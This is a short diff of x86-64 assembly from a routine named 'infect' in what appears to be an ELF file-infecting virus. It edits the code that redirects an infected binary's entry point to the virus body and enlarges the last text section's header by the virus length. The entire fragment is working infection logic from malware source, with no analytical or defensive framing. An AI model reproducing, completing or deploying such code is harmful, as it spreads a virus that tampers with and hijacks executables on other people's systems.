@@ -920,7 +920,7 @@ infect:
 					add r10, [r13 + r12 + elf_phdr.p_filesz]
 					mov qword [evaddr], r10				;save evaddr
 					
-					add dword r10d, ventry				;new entry point of infected file = evaddr + ventry
+					;add dword r10d, ventry				;new entry point of infected file = evaddr + ventry
 					;mov qword [r13 + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
 					mov qword [r13 + 24], r10	; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + elf_phdr.p_offset] 
@@ -999,10 +999,11 @@ infect:
 			add dword r11d, [r13 + r15 + elf_shdr.sh_size]
 			cmp dword r11d, vxoffset
 			jne .mod_subsequent_shdr
-			mov r10, [r13 + r15 + elf_shdr.sh_size]
-			add dword r10d, vlen
-			mov [r13 + r15 + elf_shdr.sh_size], r10
-
+			.mod_last_text_section_shdr:
+				mov r10, [r13 + r15 + elf_shdr.sh_size]
+				add dword r10d, vlen
+				mov [r13 + r15 + elf_shdr.sh_size], r10
+				jmp .next_shdr
 			.mod_subsequent_shdr:
 				mov rdx, modsubsequentshdrlen
 				lea rsi, modsubsequentshdr
